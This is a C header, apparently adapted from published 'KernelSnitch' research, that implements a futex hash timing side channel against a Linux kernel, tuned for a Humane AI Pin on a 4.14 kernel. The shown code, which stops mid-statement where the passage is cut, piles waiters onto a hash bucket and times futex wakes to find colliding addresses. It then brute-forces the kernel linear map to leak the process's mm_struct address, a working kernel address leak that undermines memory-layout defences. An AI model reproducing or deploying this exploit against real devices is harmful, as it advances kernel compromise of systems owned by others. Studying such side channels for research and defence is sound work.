/* SPDX-License-Identifier: Apache-2.0
 * Modified for bounded, verified Humane AI Pin timing searches.
 */
#pragma once

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
#define __INTEL
#endif

#define FUTEX_SZ (64ULL<<30)
#define FUTEX_MMAP_SZ (1ULL<<30)
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#ifndef KS_PAGE_SIZE
#define KS_PAGE_SIZE PAGE_SIZE
#endif
#define APPENDED_FUTEXES 4096
#define MULITPLE 4
#if defined(__INTEL) || defined(__AMD)
#define IDENTITY_START 0xffff888000000000ULL
#define IDENTITY_END   0xffffc88000000000ULL
#define COARSE_SZ (1ULL << 30)
#elif defined(__ARM)
#define VA_BITS 39
#if VA_BITS==39
#ifndef KERNELSNITCH_IDENTITY_START
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#endif
#ifndef KERNELSNITCH_IDENTITY_END
#define KERNELSNITCH_IDENTITY_END (KERNELSNITCH_IDENTITY_START + (64ULL<<30))
#endif
#define IDENTITY_START KERNELSNITCH_IDENTITY_START
#define IDENTITY_END   KERNELSNITCH_IDENTITY_END
// #define IDENTITY_END   0xffffffc000000000ULL
#elif VA_BITS==48
#define IDENTITY_START 0xffff000000000000ULL
#define IDENTITY_END   0xffff800000000000ULL
#else
#error "Unsupported VA_BITS (expected 39 or 48)"
#endif
#define COARSE_SZ (1ULL << 30)
#endif

enum kernelsnitch_state {
    KERNELSNITCH_NOT_INIT = 0,
    KERNELSNITCH_INIT,
    KERNELSNITCH_COLLISIONS_FOUND,
    KERNELSNITCH_COLLISIONS_NOT_FOUND,
    KERNELSNITCH_MM_FOUND,
    KERNELSNITCH_MM_NOT_FOUND,
    KERNELSNITCH_LAST,
};
char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
    "not initialized",
    "initialized",
    "collisions found",
    "mm_struct found",
    "mm_struct not found",
};

struct kernelsnitch_shared_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;

    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    size_t futex_hash_table_size;
    size_t total_futexes;

    volatile unsigned char *futexes;
    volatile unsigned char inc_futex[KS_PAGE_SIZE];

    volatile size_t *futex_addrs;
    volatile size_t *times;
    volatile size_t found;
    volatile size_t mm_struct;
    volatile size_t mm_batch;   /* pool window that produced mm_struct */
    volatile size_t cand_cnt;   /* verified candidate pool size (anchor + kept) */

    pthread_t *tids;
    size_t identity_diff;

    enum kernelsnitch_state state;

    int mte_enabled;
};

enum kernelsnitch_found_state {
    KERNELSNITCH_SEARCHING = 0,
    KERNELSNITCH_MM_READY = 1,
    KERNELSNITCH_MM_PUBLISHING = 2,
};

static size_t __ks_found_load(struct kernelsnitch_shared_state *ks)
{
    return __atomic_load_n(&ks->found, __ATOMIC_ACQUIRE);
}

static size_t __ks_mm_load(struct kernelsnitch_shared_state *ks)
{
    return __atomic_load_n(&ks->mm_struct, __ATOMIC_ACQUIRE);
}

static size_t __ks_mm_batch_load(struct kernelsnitch_shared_state *ks)
{
    return __atomic_load_n(&ks->mm_batch, __ATOMIC_ACQUIRE);
}

static void __ks_reset_mm_result(struct kernelsnitch_shared_state *ks)
{
    __atomic_store_n(&ks->mm_struct, (size_t)-1, __ATOMIC_RELAXED);
    __atomic_store_n(&ks->mm_batch, 0, __ATOMIC_RELAXED);
    __atomic_store_n(&ks->found, KERNELSNITCH_SEARCHING, __ATOMIC_RELEASE);
}

static void __ks_restore_mm_result(struct kernelsnitch_shared_state *ks,
                                   size_t mm_struct, size_t batch)
{
    __atomic_store_n(&ks->found, KERNELSNITCH_MM_PUBLISHING,
                     __ATOMIC_RELAXED);
    __atomic_store_n(&ks->mm_struct, mm_struct, __ATOMIC_RELAXED);
    __atomic_store_n(&ks->mm_batch, batch, __ATOMIC_RELAXED);
    __atomic_store_n(&ks->found, KERNELSNITCH_MM_READY, __ATOMIC_RELEASE);
}

static int __ks_publish_mm_result(struct kernelsnitch_shared_state *ks,
                                  size_t mm_struct, size_t batch)
{
    size_t expected = KERNELSNITCH_SEARCHING;
    if (!__atomic_compare_exchange_n(&ks->found, &expected,
                                     KERNELSNITCH_MM_PUBLISHING, 0,
                                     __ATOMIC_ACQ_REL, __ATOMIC_ACQUIRE))
        return 0;

    __atomic_store_n(&ks->mm_struct, mm_struct, __ATOMIC_RELAXED);
    __atomic_store_n(&ks->mm_batch, batch, __ATOMIC_RELAXED);
    __atomic_store_n(&ks->found, KERNELSNITCH_MM_READY, __ATOMIC_RELEASE);
    return 1;
}

#define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)

/**
 * FUTEX syscall
 */
static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
{
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

/**
 * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.id: identifier of the futex user-space address to be used for the increase
 */
struct inc_arg {
    struct kernelsnitch_shared_state *ks;
    size_t id;
    volatile size_t *entered;
};
static void *__do_increase(void *arg)
{
    struct inc_arg *inc_arg = (struct inc_arg *)arg;
    struct kernelsnitch_shared_state *ks = inc_arg->ks;
    size_t id = inc_arg->id;
    __atomic_fetch_add(inc_arg->entered, 1, __ATOMIC_RELEASE);
    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
    free(inc_arg);
    return 0;
}

/**
 * Creates threads and put them to sleep to increase the chain of a hash bucket
 * @arg ks: shared KernelSnitch state
 * @arg id: identifier of the futex user-space address to be used for the increase
 * @arg amount: increase
 */
static size_t __increase(struct kernelsnitch_shared_state *ks, size_t id,
                         size_t amount)
{
    pthread_t tid;
    size_t created = 0, failed = 0, last_errno = 0;
    volatile size_t entered = 0;
    pthread_attr_t attr;
    int attr_rc = pthread_attr_init(&attr);
    if (attr_rc != 0) {
        pr_warning("DBG __increase detached attr failed rc=%d\n", attr_rc);
        return 0;
    }
    attr_rc = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    if (attr_rc != 0) {
        pthread_attr_destroy(&attr);
        pr_warning("DBG __increase detached attr failed rc=%d\n", attr_rc);
        return 0;
    }
    pr_warning("DBG __increase enter id=%zu amount=%zu\n", id, amount);
    for (size_t i = 0; i < amount; ++i) {
        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
        inc_arg->id = id;
        inc_arg->ks = ks;
        inc_arg->entered = &entered;
        int rc = pthread_create(&tid, &attr, __do_increase, (void *)inc_arg);
        if (rc == 0) { created++; }
        else { failed++; last_errno = rc; free(inc_arg); }
        if ((i % 512) == 511)
            pr_warning("DBG __increase progress i=%zu created=%zu failed=%zu\n", i+1, created, failed);
    }
    pthread_attr_destroy(&attr);
    pr_warning("DBG __increase done id=%zu created=%zu failed=%zu last_errno=%zu\n", id, created, failed, last_errno);
    for (size_t spins = 0;
         spins < 65536 &&
             __atomic_load_n(&entered, __ATOMIC_ACQUIRE) < created;
         ++spins)
        sched_yield();
    size_t entered_final = __atomic_load_n(&entered, __ATOMIC_ACQUIRE);
    for (int y = 0; y < 32; ++y)
        sched_yield();
    pr_warning("DBG __increase wait done entered=%zu/%zu detached=1\n",
               entered_final, created);
    if (entered_final != created)
        return 0;
    return created;
}

/**
 * Simple compare
 */
#define REPEAT_MEASUREMENT 128
#define AVERAGE (1<<3)
static int __compare(const void *a, const void *b)
{
    return (*(size_t *)a - *(size_t *)b);
}

/**
 * Performs the non-destructive traversal of the hashbucket futex_hash(futex_addr, current->mm_struct)
 * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
 * @return averaged time of the futex wait operation
 */
static size_t g_last_measure_min, g_last_measure_med, g_last_measure_max;
static size_t __measure(size_t futex_addr)
{
    size_t t0;
    size_t t1;
    size_t time = 0;
    // do some simple signal processing and reject bad ones
    size_t __times[REPEAT_MEASUREMENT];
    for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
        sched_yield();
        t0 = rdtsc_begin();
        long wr = __futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
        t1 = rdtsc_end();
        if (wr < 0) pr_warning("measure: futex_wake errno=%d\n", errno);
        __times[l] = t1 - t0;
    }
    qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
    for (size_t l = 0; l < AVERAGE; ++l)
        time += __times[l];
    time /= AVERAGE;
    g_last_measure_min = __times[0];
    g_last_measure_med = __times[REPEAT_MEASUREMENT/2];
    g_last_measure_max = __times[REPEAT_MEASUREMENT-1];
    return time;
}

/**
 * Performs the bruteforce leak in the range [start, end]
 * @arg arg.ks: shared KernelSnitch state
 * @arg arg.range: range of the bruteforce attempt
 */
struct range {
    size_t id;
    size_t start;
    size_t end;
};
struct mm_leak_arg {
    struct kernelsnitch_shared_state *ks;
    struct range range;
    size_t stride;
    size_t batch_off;   /* window into ks->futex_addrs pool */
};
static void *__mm_leak(void *arg)
{
    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
    struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
    struct range *range = &mm_leak_arg->range;
    /* Diagnosis counters: how many candidates satisfy k-of-N hash
     * equalities.  With a correct model and 2048 buckets the expected
     * counts over an N-candidate scan are N/2048^3 (k=3) and
     * N/2048^4 (k=4); zero k>=2 hits means the hash model is wrong. */
    size_t diag_eq[7] = {0};
    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    size_t batch_off = mm_leak_arg->batch_off;
    for (size_t coarse_addr = range->start;
         (coarse_addr < range->end) &&
             __ks_found_load(ks) == KERNELSNITCH_SEARCHING;
         coarse_addr += COARSE_SZ) {
        /*
         * The top range ends at 2^64; coarse_addr wraps to 0 there and
         * would restart the scan over non-linear garbage forever.
         */
        if (coarse_addr < range->start)
            break;
        if ((coarse_addr % (1ULL << 40)) == 0)
            if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
        for (size_t slab_addr = coarse_addr;
             (slab_addr < coarse_addr + COARSE_SZ) &&
                 __ks_found_load(ks) == KERNELSNITCH_SEARCHING;
             slab_addr += mm_slab_sz) {
            (void)mm_slab_sz;
            for (size_t mm_struct_candidate = slab_addr;
                 (mm_struct_candidate < slab_addr + mm_slab_sz) &&
                     __ks_found_load(ks) == KERNELSNITCH_SEARCHING;
                 mm_struct_candidate += mm_leak_arg->stride) {

                size_t found_hash = 1;
                if (!ks->mte_enabled) {
                    // test the mm_struct candidate (early exit: 1/2048 of
                    // candidates survive the first comparison, so the
                    // average cost is ~1 hash instead of `collisions`)
                    uint32_t h0 = futex_hash(ks->futex_addrs[batch_off], mm_struct_candidate);
                    size_t eq = 1;
                    for (size_t i = 1; i < ks->collisions; ++i) {
                        if (h0 != futex_hash(ks->futex_addrs[batch_off + i], mm_struct_candidate))
                            { found_hash = 0; break; }
                        eq++;
                    }
                    diag_eq[eq <= 6 ? eq : 6]++;
                    if (found_hash &&
                        __ks_publish_mm_result(ks, mm_struct_candidate,
                                               batch_off)) {
                        break;
                    }
                } else {
                    // need to set the tag if mte is enabled
                    for (size_t tag_candidate = 0;
                         tag_candidate < 15 &&
                             __ks_found_load(ks) == KERNELSNITCH_SEARCHING;
                         ++tag_candidate) {
                        size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                        __mm_struct_candidate |= (tag_candidate << 56);
                        found_hash = 1;
                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                            found_hash = (futex_hash(ks->futex_addrs[batch_off], __mm_struct_candidate) == futex_hash(ks->futex_addrs[batch_off + i], __mm_struct_candidate));
                        if (found_hash) {
                            if (ks->verbose)
                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
                            if (__ks_publish_mm_result(
                                    ks, __mm_struct_candidate, batch_off))
                                break;
                        }
                    }
                }
            }
        }
    }
    if (ks->verbose) {
        pr_warning("DBG bruteforce diag batch=%zu [%016zx-%016zx] eq1=%zu eq2=%zu eq3=%zu eq4=%zu eq5=%zu eq6=%zu\n",
                 batch_off, range->start, range->end, diag_eq[1], diag_eq[2],
                 diag_eq[3], diag_eq[4], diag_eq[5], diag_eq[6]);
    }
    free(mm_leak_arg);
    return 0;
}

static int __ks_run_mm_batch(struct kernelsnitch_shared_state *ks,
                             size_t batch, size_t stride)
{
    size_t created = 0;
    size_t joined = 0;
    int create_rc = 0;

    __ks_reset_mm_result(ks);
    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        struct mm_leak_arg *mm_leak_arg = calloc(1, sizeof(*mm_leak_arg));
        if (!mm_leak_arg) {
            create_rc = ENOMEM;
            break;
        }
        mm_leak_arg->ks = ks;
        mm_leak_arg->range.id = i;
        /* Scan the linear window from the top down. */
        size_t idx = ks->thread_cnt - 1 - i;
        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*idx;
        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(idx+1);
        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
            mm_leak_arg->range.start &= ~(COARSE_SZ - 1);
        if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
            mm_leak_arg->range.end =
                (mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ;
        /* The top VA39 range wraps at 2^64. */
        if (mm_leak_arg->range.end <= mm_leak_arg->range.start)
            mm_leak_arg->range.end = (size_t)-1;
        mm_leak_arg->stride = stride;
        mm_leak_arg->batch_off = batch;

        create_rc = pthread_create(&ks->tids[i], 0, __mm_leak,
                                   mm_leak_arg);
        if (create_rc != 0) {
            free(mm_leak_arg);
            break;
        }
        created++;
    }

    if (created != ks->thread_cnt) {
        /* Stop any workers already launched; this batch cannot be trusted. */
        __atomic_store_n(&ks->found, KERNELSNITCH_MM_PUBLISHING,
                         __ATOMIC_RELEASE);
    }
    for (size_t i = 0; i < created; ++i) {
        int join_rc = pthread_join(ks->tids[i], 0);
        if (join_rc != 0)
            pr_error("KernelSnitch pthread_join failed worker=%zu rc=%d\n",
                     i, join_rc);
        joined++;
    }

    pr_warning("DBG batch workers batch=%zu stride=%zu created=%zu joined=%zu required=%zu create_rc=%d\n",
               batch, stride, created, joined, ks->thread_cnt, create_rc);
    if (created != ks->thread_cnt || joined != ks->thread_cnt) {
        pr_warning("DBG batch rejected: incomplete worker set\n");
        __ks_reset_mm_result(ks);
        return 0;
    }
    return 1;
}

static int __ks_validate_mm_pool(struct kernelsnitch_shared_state *ks,
                                 size_t mm_struct, size_t pool)
{
    if (pool < ks->collisions) {
        pr_warning("DBG mm corroboration rejected: pool=%zu collisions=%zu\n",
                   pool, ks->collisions);
        return 0;
    }

    uint32_t expected = futex_hash(ks->futex_addrs[0], mm_struct);
    for (size_t i = 1; i < pool; ++i) {
        uint32_t actual = futex_hash(ks->futex_addrs[i], mm_struct);
        if (actual != expected) {
            pr_warning("DBG mm corroboration mismatch index=%zu expected=%u actual=%u\n",
                       i, expected, actual);
            return 0;
        }
    }
    pr_warning("DBG mm corroboration pool_matches=%zu/%zu bucket=%u\n",
               pool, pool, expected);
    return 1;
}

/****************************************************************************************************************/
/* EXTERNAL FUNCTIONS                                                                                           */
/****************************************************************************************************************/

/**
 * Setup phase of KernelSnitch
 * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
 * @arg __mm_slab_order: the order of the mm_struct slab
 * @arg __thread_cnt: thread count used for the bruteforcing phase
 * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
 * @arg __verbose: amount of print info (1...enabled; 0...disabled)
 * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
 * @return shared KernelSnitch state
 */
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    __ks_reset_mm_result(ks);
    ks->cand_cnt = 0;
    ks->mm_struct_sz = __mm_struct_sz;
    ks->mm_slab_order = __mm_slab_order;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
    ks->thread_cnt = __thread_cnt;
    ks->collisions = __collision_cnt;
    ks->verbose = __verbose;
    ks->mte_enabled = __mte_enabled;

    // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
    ks->futex_hash_table_size = 256*ks->cpu_cnt;
    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
    for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
    ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);

    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*64, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));

    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
        ks->cpu_cnt,
        ks->mm_struct_sz,
        ks->mm_slab_order,
        ks->thread_cnt,
        ks->collisions,
        ks->mte_enabled ? "enabled" : "disabled");
    pin_to_core(0);
    futex_init();
    if (futex_hashsize != 2048) {
        pr_error("KernelSnitch effective hashsize=%lu; expected 2048\n",
                 futex_hashsize);
    }
    pr_warning("KernelSnitch effective hashsize=%lu\n", futex_hashsize);

    ks->state = KERNELSNITCH_INIT;
    return ks;
}

/**
 * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
{
    #define ID 128
#ifndef KERNELSNITCH_THRESHOLD_MULT
#define KERNELSNITCH_THRESHOLD_MULT 3  /* Lowered from 10 for 4.14 kernel */
#endif
    size_t count = 0;
    size_t wanted;
    size_t futex_addr;
    size_t id;
    ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
    ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
    wanted = ks->collisions - 1;

    size_t m_empty1 = __measure((size_t)&ks->futexes[0]);
    size_t m_empty2 = __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]);
    size_t approx_time = MIN(m_empty1, m_empty2);
    pr_warning("DBG empty-bucket measure1=%zu (min %zu med %zu max %zu) measure2=%zu\n",
             m_empty1, g_last_measure_min, g_last_measure_med, g_last_measure_max, m_empty2);

    // piled-up hash bucket ID 128
    // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
    size_t pile_created = __increase(ks, ID, APPENDED_FUTEXES);
    /*
     * Do not call __measure() on the pile futex itself.  This vendor 4.14
     * futex_wake() wakes one matching waiter even when nr_wake is zero:
     * mark_wake_futex() runs before `if (++ret >= nr_wake)`.  __measure()
     * repeats the call 128 times, so the old contrast probe silently removed
     * exactly 128 of the 4096 waiters (live drain telemetry: 3968/4096).
     * Candidate addresses use distinct futex keys and therefore traverse the
     * piled bucket without matching or waking its waiters.  Check contrast on
     * those candidates below, then require the final drain to wake all 4096.
     */
    pr_warning("DBG piled-bucket(ID=%d) direct measure deferred (nr_wake=0 is destructive on 4.14)\n",
             ID);
    pr_warning("DBG threshold = approx*%d = %zu\n", KERNELSNITCH_THRESHOLD_MULT,
             approx_time*KERNELSNITCH_THRESHOLD_MULT);
    if (pile_created != APPENDED_FUTEXES || approx_time == 0) {
        int woken = __futex((unsigned int *)&ks->inc_futex[ID],
                            FUTEX_WAKE_PRIVATE, 0x7fffffff,
                            NULL, NULL, 0);
        pr_warning("DBG pile gate rejected created=%zu/%d woken=%d "
                   "empty=%zu\n",
                   pile_created, APPENDED_FUTEXES, woken,
                   approx_time);
        ks->cand_cnt = 0;
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }
    if (ks->verbose) pr_info("start finding collisisons\n");

    // find futex user space address which collide with the piled-up hash bucket ID 128
    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
    size_t dbg_max = 0, dbg_sum = 0, dbg_n = 0;
    for (size_t i = 2; i < ks->total_futexes && count < 60; ++i) {
        id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
        if (id >= FUTEX_SZ)
            break;
        futex_addr = (size_t)&ks->futexes[id];
        ks->times[i] = __measure(futex_addr);
        dbg_sum += ks->times[i]; dbg_n++;
        if (ks->times[i] > dbg_max) dbg_max = ks->times[i];
        if ((dbg_n % 8192) == 0)
            pr_warning("DBG scan progress n=%zu avg=%zu max=%zu count=%zu\n",
                     dbg_n, dbg_sum/dbg_n, dbg_max, count);
        if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
            /*
             * 3x re-verification: unrelated busy buckets that spike once
             * (transient system activity) usually re-measure fast; a true
             * pile-bucket member stays slow across repeated measures.
             * Require the spike to reproduce on two fresh measurements
             * before accepting the candidate.
             */
            size_t re1 = __measure(futex_addr);
            size_t re2 = __measure(futex_addr);
            size_t thr = approx_time*KERNELSNITCH_THRESHOLD_MULT;
            if (re1 <= thr || re2 <= thr) {
                pr_warning("DBG candidate at i=%zu rejected re-verify (%zu/%zu vs thr %zu)\n",
                         i, re1, re2, thr);
                continue;
            }
            count++;
            ks->futex_addrs[count] = futex_addr;
            pr_warning("DBG collision candidate #%zu at i=%zu time=%zu re=%zu/%zu (min %zu med %zu max %zu)\n",
                     count, i, ks->times[i], re1, re2, g_last_measure_min, g_last_measure_med, g_last_measure_max);
            if (ks->verbose) pr_info("  %016zx\n", futex_addr);
        }
    }
    pr_warning("DBG scan done: measured=%zu avg=%zu max=%zu collisions_found=%zu wanted=%zu\n",
             dbg_n, dbg_n ? dbg_sum/dbg_n : 0, dbg_max, count, wanted);

    /*
     * Drain-discrimination.  A 4.14 kernel has only ~2048 global futex
     * buckets shared by every process, so an Android system keeps many
     * non-empty buckets whose walk latency also crosses the naive
     * threshold; those "candidates" correlate with nothing and make the
     * mm preimage search unsatisfiable (observed: five-equality solution
     * count zero over the entire 256 GB linear window).  A true
     * pile-bucket candidate is distinguished deterministically: after
     * waking the whole pile, its wake latency collapses to ~empty, while
     * an unrelated busy bucket stays slow.  Keep only collapsing
     * candidates.
     */
    size_t m_before[64];
    if (count > 60)
        count = 60;
    for (size_t k = 1; k <= count; ++k)
        m_before[k] = __measure(ks->futex_addrs[k]);
    int pile_woken = __futex((unsigned int *)&ks->inc_futex[ID],
                             FUTEX_WAKE_PRIVATE, 0x7fffffff,
                             NULL, NULL, 0);
    pr_warning("DBG pile drain woken=%d/%d\n",
               pile_woken, APPENDED_FUTEXES);
    for (int y = 0; y < 32; ++y)
        sched_yield();
    /*
     * Keep the whole verified pool (bounded), not exactly `wanted`:
     * the bruteforce tries consecutive windows of ks->collisions
     * addresses, so a few drain-verification false positives no longer
     * poison the only batch.
     */
    size_t kept = 0;
    const size_t keep_max = 24;
    size_t min_kept_before = (size_t)-1;
    for (size_t k = 1; k <= count; ++k) {
        size_t m_after = __measure(ks->futex_addrs[k]);
        const char *verdict =
            (m_before[k] / 3 > m_after) ? "PILE" : "unrelated";
        pr_warning("DBG candidate #%zu verify before=%zu after=%zu %s\n",
                 k, m_before[k], m_after, verdict);
        if (m_before[k] / 3 > m_after && kept < keep_max) {
            kept++;
            if (m_before[k] < min_kept_before)
                min_kept_before = m_before[k];
            ks->futex_addrs[kept] = ks->futex_addrs[k];
        }
    }
    count = kept;
    ks->cand_cnt = kept + 1;    /* pool = anchor + kept, futex_addrs[0..kept] */
    pr_warning("DBG drain filter kept=%zu of wanted=%zu pool=%zu\n", kept, wanted, ks->cand_cnt);

    int contrast_ok = kept > 0 &&
        min_kept_before >= approx_time * 10;
    pr_warning("DBG contrast gate min_kept=%zu empty=%zu ratio=%zux ok=%d\n",
               min_kept_before, approx_time,
               (kept > 0 && approx_time) ? min_kept_before / approx_time : 0,
               contrast_ok);

    if (pile_woken != APPENDED_FUTEXES || !contrast_ok) {
        pr_warning("DBG pile drain rejected: woken=%d expected=%d contrast_ok=%d\n",
                   pile_woken, APPENDED_FUTEXES, contrast_ok);
        ks->cand_cnt = 0;
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }

    if (kept >= wanted) {
        if (ks->verbose) pr_info("found %zd collisisons\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_FOUND;
    } else {
        pr_warning("only found %zd collisions -> cannot continue\n", count);
        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
    }
}
size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
    return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
}

/**
 * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
 * @arg ks: shared KernelSnitch state
 */
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
    if (ks->verbose) pr_info("start bruteforcing\n");
    reset_cpu_pin();

    /* Diagnostic/override: candidate strides.  The mm_struct SLUB stride
     * is assumed 0x380 (size 0x370, HWCACHE_ALIGN), but on this build
     * mm_struct comes out of a merged kmalloc cache and the empirically
     * recovered mm is only known to be >=128-aligned (kmalloc-1024 slab
     * objects are 128..1024 aligned).  Sweep cheap coarse strides first,
     * then fall back to every 8-byte-aligned value.
     * AI_PIN_KS_STRIDE pins a single stride for experiments. */
    size_t strides[3] = { ks->mm_struct_sz, 128, 8 };
    size_t stride_cnt = 3;
    {
        const char *stride_env = getenv("AI_PIN_KS_STRIDE");
        if (stride_env && *stride_env) {
            unsigned long long value = strtoull(stride_env, NULL, 0);
            if (value >= 8 && value <= 0x8000) {
                strides[0] = (size_t)value;
                strides[1] = (size_t)value;
                strides[2] = (size_t)value;
                stride_cnt = 1;
                pr_warning("KS stride override=%zu\n", strides[0]);
            }
        }
    }

    /*
     * The candidate pool (ks->cand_cnt entries, futex_addrs[0] = pile
     * anchor) may contain a few drain-verification false positives; a
     * single poisoned address makes a batch unsatisfiable.  Try every
     * consecutive window of ks->collisions addresses, reporting which
     * batch resolves an mm.  Each window is scanned with the fast SLUB
     * stride first, then (if nothing resolved anywhere) every window
     * is retried with the 8-byte-aligned stride.
    */
    size_t pool = ks->cand_cnt ? ks->cand_cnt : ks->collisions;
    size_t resolved_mm = (size_t)-1;
    size_t resolved_batch = 0;
    size_t resolved_stride = 0;
    int worker_failure = 0;
    for (size_t s = 0; s < stride_cnt && resolved_mm == (size_t)-1; ++s) {
        size_t stride = strides[s];
        for (size_t batch = 0;
             batch + ks->collisions <= pool &&
                 resolved_mm == (size_t)-1;
             ++batch) {
            if (ks->verbose || 1)
                pr_warning("DBG batch window=%zu stride=%zu pool=%zu\n", batch, stride, pool);
            if (!__ks_run_mm_batch(ks, batch, stride)) {
                worker_failure = 1;
                break;
            }
            if (__ks_found_load(ks) == KERNELSNITCH_MM_READY) {
                resolved_mm = __ks_mm_load(ks);
                resolved_batch = __ks_mm_batch_load(ks);
                resolved_stride = stride;
                pr_warning("DBG batch window=%zu stride=%zu resolved mm=%016zx\n",
                           resolved_batch, stride, resolved_mm);
            }
        }
        if (worker_failure)
            break;
    }

    if (worker_failure || resolved_mm == (size_t)-1)
        goto reject_mm;
    if (!__ks_validate_mm_pool(ks, resolved_mm, pool))
        goto reject_mm;

    if (pool >= 2 * ks->collisions) {
        const size_t confirmation_batches[2] = { 0, ks->collisions };
        for (size_t i = 0; i < 2; ++i) {
            size_t confirmation_batch = confirmation_batches[i];
            size_t confirmation_mm = resolved_mm;
            if (confirmation_batch != resolved_batch) {
                if (!__ks_run_mm_batch(ks, confirmation_batch,
                                       resolved_stride)) {
                    worker_failure = 1;
                    goto reject_mm;
                }
                confirmation_mm =
                    __ks_found_load(ks) == KERNELSNITCH_MM_READY
                        ? __ks_mm_load(ks) : (size_t)-1;
            }
            pr_warning("DBG mm disjoint confirmation group=%zu batch=%zu primary_batch=%zu primary=%016zx confirmation=%016zx\n",
                       i, confirmation_batch, resolved_batch, resolved_mm,
